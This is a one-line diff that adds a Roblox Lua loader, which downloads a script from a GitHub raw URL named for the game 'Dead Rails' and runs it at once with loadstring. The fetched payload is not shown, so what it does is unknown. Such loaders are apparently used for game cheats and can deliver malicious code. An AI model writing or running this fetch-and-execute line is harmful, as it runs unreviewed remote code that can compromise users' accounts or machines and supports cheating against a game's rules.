@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/dead-rails-spam1-vhwa1i8fgwm0g9.lua"))()
